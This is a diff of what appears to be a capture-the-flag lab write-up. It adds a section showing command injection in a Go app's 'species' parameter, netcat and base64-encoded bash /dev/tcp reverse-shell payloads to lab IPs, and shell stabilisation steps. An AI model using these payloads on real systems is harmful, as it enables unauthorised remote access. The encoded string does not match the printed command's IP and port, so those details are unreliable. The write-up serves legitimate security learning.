@@ -21,7 +21,7 @@ output: html_document
 </div>
 
 **Ports/services exploited:** ?\\
-**Tools:** dirb, gobuster\\
+**Tools:** dirb, gobuster, git dumper, git extractor, tcpdump\\
 **Techniques:** ?\\
 **Keywords:** Golang (Go)?
 
@@ -275,7 +275,63 @@ func loadCharacter(species string) string {
 }
 ````
 
-We see the function *loadCharacter* uses *exec.Command()*, and maybe we could use it somehow to execute other commands. Previously, we were trying to use the *name* parameter to inject code. Let's try to add the *species* paramater and issue a command. To do so, we start Burp once again and send the request to the repeater. There, we add *species* and see what happens. To test that, we can try to ping ourselves.
+We see the function *loadCharacter* uses *exec.Command()*, and maybe we could use it somehow to execute other commands. Previously, we were trying to use the *name* parameter to inject code. Let's try to add the *species* paramater and issue a command. To do so, we start Burp once again and send the request to the repeater. There, we add *species* and see what happens. Let's try to ping ourselves to see if it works.
+
+<div class="img_container">
+![ping]({{https://jsom1.github.io/}}/_images/htb_dz_ping.png)
+</div>
+
+Before sending this request, we open *tcpdump* to see the ping:
+
+````
+sudo tcpdump -i tun0 icmp
+``````
+
+Note that we specify *icmp* to only see ICMP packets.
+
+<div class="img_container">
+![ping reception]({{https://jsom1.github.io/}}/_images/htb_dz_pingrec.png)
+</div>
+
+Great, it works! So we can very likely get a reverse shell! let's try with the following payload:
+
+```
+{
+  "name":"test"
+  "species":"cat;nc -nv 10.110.14.9 4444"
+}
+`````
+
+Before sending the request, we must setup a netcat listener on our machine:
+
+````
+sudo nc -nlvp 4444
+`````
+
+However, we get nothing back... I had to askk for help at this point. We have to encode the payload with the following command:
+
+````
+sudo echo -n ‘bash -i >& /dev/tcp/10.10.14.6/9001 0>&1’ | base64
+`````
+This commands encodes *bash -i >& /dev/tcp/10.10.14.6/9001 0>&1* in base64, returning *YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45LzQ0NDQgMD4mMQ==*. We can use this in the payload, and add * | base64 -d | bash* at the end (*-d* to decode). The payload then becomes:
+
+```
+{
+  "name":"test"
+  "species":"cat;echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45LzQ0NDQgMD4mMQ== | base64 -d | bash"
+}
+`````
+<div class="img_container">
+![revsh]({{https://jsom1.github.io/}}/_images/htb_dz_revsh.png)
+</div>
+
+And we're finally in as Patrick! It's not shown in the picture, but every character I type in this reverse shell is doubled... It's very annoying, even though the commands work. This is because both terminals have stty echo, so we can fix this with the following commands:
+
+````
+ctrl+Z
+stty -echo
+fg
+````
 
 
 
